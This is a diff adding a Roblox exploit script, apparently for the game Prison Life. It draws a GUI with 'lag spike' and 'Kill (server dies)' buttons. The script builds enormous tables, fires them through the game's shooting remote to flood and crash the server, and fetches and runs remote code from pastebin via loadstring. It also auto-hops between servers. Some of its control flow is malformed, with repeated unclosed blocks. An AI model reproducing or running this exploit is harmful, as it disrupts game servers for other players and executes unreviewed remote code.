@@ -1,0 +1,258 @@
+local AltF4_PL = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local title = Instance.new("TextLabel")
+local small = Instance.new("TextButton")
+local bigger = Instance.new("TextButton")
+local evenbigger = Instance.new("TextButton")
+local kill = Instance.new("TextButton")
+local num = Instance.new("TextBox")
+local custom = Instance.new("TextButton")
+local status = Instance.new("TextLabel")
+local credits = Instance.new("TextBox")
+local network = Instance.new("TextLabel")
+
+AltF4_PL.Name = "AltF4_PL"
+AltF4_PL.Parent = game:GetService("CoreGui")
+AltF4_PL.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+main.Name = "main"
+main.Parent = AltF4_PL
+main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+main.BorderColor3 = Color3.fromRGB(0, 255, 0)
+main.BorderSizePixel = 2
+main.Position = UDim2.new(0.100000001, 0, 0.150000006, 0)
+main.Size = UDim2.new(0, 340, 0, 160)
+main.Visible = false
+
+title.Name = "title"
+title.Parent = main
+title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+title.Size = UDim2.new(0, 340, 0, 30)
+title.Font = Enum.Font.SciFi
+title.Text = "AltF4_PL "
+title.TextColor3 = Color3.fromRGB(0, 255, 0)
+title.TextScaled = true
+title.TextSize = 14.000
+title.TextWrapped = true
+title.TextXAlignment = Enum.TextXAlignment.Right
+
+small.Name = "small"
+small.Parent = main
+small.BackgroundColor3 = Color3.fromRGB(197, 197, 197)
+small.BorderColor3 = Color3.fromRGB(255, 255, 255)
+small.BorderSizePixel = 2
+small.Position = UDim2.new(0, 5, 0, 36)
+small.Size = UDim2.new(0, 165, 0, 30)
+small.ZIndex = 0
+small.Font = Enum.Font.SourceSans
+small.Text = "Small lag spike"
+small.TextColor3 = Color3.fromRGB(0, 0, 0)
+small.TextSize = 15.000
+
+bigger.Name = "bigger"
+bigger.Parent = main
+bigger.BackgroundColor3 = Color3.fromRGB(197, 197, 197)
+bigger.BorderColor3 = Color3.fromRGB(255, 255, 255)
+bigger.BorderSizePixel = 2
+bigger.Position = UDim2.new(0, 170, 0, 36)
+bigger.Size = UDim2.new(0, 165, 0, 30)
+bigger.ZIndex = 0
+bigger.Font = Enum.Font.SourceSans
+bigger.Text = "Bigger lag spike"
+bigger.TextColor3 = Color3.fromRGB(0, 0, 0)
+bigger.TextSize = 15.000
+
+evenbigger.Name = "even bigger"
+evenbigger.Parent = main
+evenbigger.BackgroundColor3 = Color3.fromRGB(197, 197, 197)
+evenbigger.BorderColor3 = Color3.fromRGB(255, 255, 255)
+evenbigger.BorderSizePixel = 2
+evenbigger.Position = UDim2.new(0, 5, 0, 66)
+evenbigger.Size = UDim2.new(0, 165, 0, 30)
+evenbigger.ZIndex = 0
+evenbigger.Font = Enum.Font.SourceSans
+evenbigger.Text = "Even bigger lag spike"
+evenbigger.TextColor3 = Color3.fromRGB(0, 0, 0)
+evenbigger.TextSize = 15.000
+
+kill.Name = "kill"
+kill.Parent = main
+kill.BackgroundColor3 = Color3.fromRGB(197, 197, 197)
+kill.BorderColor3 = Color3.fromRGB(255, 255, 255)
+kill.BorderSizePixel = 2
+kill.Position = UDim2.new(0, 170, 0, 66)
+kill.Size = UDim2.new(0, 165, 0, 30)
+kill.ZIndex = 0
+kill.Font = Enum.Font.SourceSans
+kill.Text = "Kill (server dies)"
+kill.TextColor3 = Color3.fromRGB(255, 0, 0)
+kill.TextSize = 15.000
+
+num.Name = "num"
+num.Parent = main
+num.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+num.BorderColor3 = Color3.fromRGB(0, 0, 0)
+num.BorderSizePixel = 0
+num.Position = UDim2.new(0, 7, 0, 110)
+num.Size = UDim2.new(0, 161, 0, 30)
+num.Font = Enum.Font.SourceSans
+num.PlaceholderText = "Custom amount"
+num.Text = ""
+num.TextColor3 = Color3.fromRGB(255, 255, 255)
+num.TextSize = 14.000
+
+custom.Name = "custom"
+custom.Parent = main
+custom.BackgroundColor3 = Color3.fromRGB(197, 197, 197)
+custom.BorderSizePixel = 0
+custom.Position = UDim2.new(0, 172, 0, 110)
+custom.Size = UDim2.new(0, 161, 0, 30)
+custom.Font = Enum.Font.SourceSans
+custom.Text = "Fire custom amount"
+custom.TextColor3 = Color3.fromRGB(0, 0, 0)
+custom.TextSize = 20.000
+
+status.Name = "status"
+status.Parent = main
+status.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+status.BorderSizePixel = 0
+status.Position = UDim2.new(0, 0, 0, 145)
+status.Size = UDim2.new(0, 240, 0, 15)
+status.Font = Enum.Font.SourceSans
+status.Text = "Status bar"
+status.TextColor3 = Color3.fromRGB(0, 255, 0)
+status.TextSize = 16.000
+
+credits.Name = "credits"
+credits.Parent = main
+credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+credits.BackgroundTransparency = 1.000
+credits.Position = UDim2.new(0, 0, 0, 2)
+credits.Size = UDim2.new(0, 200, 0, 10)
+credits.Font = Enum.Font.SourceSans
+credits.Text = "UFOpilot from FE building"
+credits.TextColor3 = Color3.fromRGB(95, 95, 95)
+credits.TextSize = 14.000
+credits.ClearTextOnFocus = false
+
+network.Name = "network"
+network.Parent = main
+network.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+network.BorderSizePixel = 0
+network.Position = UDim2.new(0, 240, 0, 145)
+network.Size = UDim2.new(0, 100, 0, 15)
+network.Font = Enum.Font.SourceSans
+network.Text = "Network KB/s"
+network.TextColor3 = Color3.fromRGB(0, 255, 0)
+network.TextSize = 16.000
+
+function set(txt)status.Text=(txt)wait()end
+local Z=Vector3.new()
+local main={Hit=nil;Distance=0;Cframe=CFrame.new(Z,Z)*CFrame.new(0,0,0);RayObject=Ray.new(Z,Z);}
+smallTable,biggerTable,EvenBiggerTable,KillTable = {},{},{},{};
+for i=1,100 do
+	for i=1,10 do table.insert(smallTable,main)end
+	if i/math.floor(i/10)/10 == 1 then
+		set("Status 0% <> "..tostring(i).."%")
+	end
+end 
+for i=1,100 do
+	for i=1,100 do table.insert(biggerTable,main)end
+	if i/math.floor(i/10)/10 == 1 then
+		set("Status 25% <> "..tostring(i).."%")
+	end
+end
+for i=1,100 do
+	for i=1,1000 do table.insert(EvenBiggerTable,main)end
+	if i/math.floor(i/10)/10 == 1 then
+		set("Status 50% <> "..tostring(i).."%")
+	end
+end
+for i=1,100 do
+	for i=1,10000 do table.insert(KillTable,main)end
+	if i/math.floor(i/10)/10 == 1 then
+		set("Status 75% <> "..tostring(i).."%")
+	end
+end
+local remote = game:GetService("ReplicatedStorage").ShootEvent
+local plr = game:GetService("Players").LocalPlayer
+function getGun()
+	local gun = plr.Backpack:FindFirstChild("M9") or plr.Character:FindFirstChild("M9")
+	if gun then
+		return gun
+	else
+		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
+		local gun = plr.Backpack:FindFirstChild("M9")
+		return gun
+	end
+end
+	local gun = getGun()
+	if gun then wait(.5)
+		remote:FireServer(KillTable,gun)
+		set("Fired "..#KillTable)
+wait()
+	local gun = getGun()
+	if gun then wait(.5)
+		remote:FireServer(KillTable,gun)
+		set("Fired "..#KillTable)
+wait()
+	local gun = getGun()
+	if gun then wait(.5)
+		remote:FireServer(KillTable,gun)
+		set("Fired "..#KillTable)
+wait()
+	local gun = getGun()
+	if gun then wait(.5)
+		remote:FireServer(KillTable,gun)
+		set("Fired "..#KillTable)
+local customTable = {}
+function getT(amount)amount = math.floor(amount)
+	if amount == #customTable then return end
+	customTable = {}
+	if amount <= 1000 then
+		set("Creating table")
+		for i=1,amount do
+			table.insert(customTable,main)
+		end
+	else
+		local x = math.floor(amount/100)
+		for i=1,100 do
+			local remainder = amount - x
+			for i=1,x do table.insert(customTable,main)end
+			if i/math.floor(i/10)/10 == 1 then
+				set("Status Custom% <> "..tostring(i).."%")
+			end
+		end
+		for i=1,amount-x do
+			table.insert(customTable,main)
+		end
+	end
+end
+end
+end
+end
+end
+local stats = game:GetService("Stats")
+local step = game:GetService("RunService").RenderStepped
+local digits = 10
+step:Connect(function()
+	network.Text = tostring(math.floor(stats.DataSendKbps*digits)/digits).."KB/s"
+end)
+set("Status 100% Loaded")
+queue_on_teleport([[
+
+]])
+loadstring(game:HttpGet("https://pastebin.com/raw/PiJXMBr6"))()(AltF4_PL.main)--drag
+local prompt = assert(game:GetService("CoreGui"):FindFirstChild("promptOverlay", true), "Lol it should work :/")
+assert(not prompt:FindFirstChild("ErrorPrompt"), prompt:FindFirstChild("ErrorPrompt") and wait(2) and game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer))
+prompt.ChildAdded:Connect(function(child)
+while wait() do
+local HttpService, TPService = game:GetService("HttpService"), game:GetService("TeleportService")
+local ServersToTP = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
+for _, s in pairs(ServersToTP.data) do
+   if s.playing ~= s.maxPlayers  and s.ping < 100 and s.id ~= game.JobId then
+       TPService:TeleportToPlaceInstance(game.PlaceId, s.id)
+   end
+end
+end
+end)
